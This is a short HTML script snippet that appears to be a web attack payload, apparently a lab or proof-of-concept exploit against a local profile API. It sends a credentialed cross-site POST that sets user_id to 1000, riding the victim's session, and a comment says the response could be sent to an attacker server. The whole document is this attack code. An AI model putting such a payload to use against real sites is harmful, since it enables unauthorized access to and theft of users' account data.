<script>

let data = {}
data.user_id = 1000;

fetch("http://127.0.0.1:8000/api/profile", {
    "credentials": "include",
    "headers": {
	'Content-Type': 'application/json',
    },
    "referrer": "http://127.0.0.1:8000/profile/1000",
    "body": JSON.stringify(data),
    "method": "POST",
    "mode": "no-cors"
}).then(() => { // do something with data, like send to attacker server
})


</script>
